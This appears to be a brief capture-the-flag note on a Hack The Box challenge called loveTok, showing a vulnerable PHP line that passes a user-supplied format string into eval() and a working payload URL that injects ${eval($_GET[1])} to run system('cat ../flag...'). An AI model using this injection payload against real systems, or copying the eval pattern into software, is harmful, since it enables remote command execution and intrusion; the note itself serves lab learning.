# Eval

```
#Example code from htb loveTok
# $this->format vulnurble
#payload in the url parameter
#http://209.97.187.217:30452/?format=$%7Beval($_GET%5B1%5D)%7D&1=system(%27cat%20../flagvfXsm%27);

#vulncode
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```
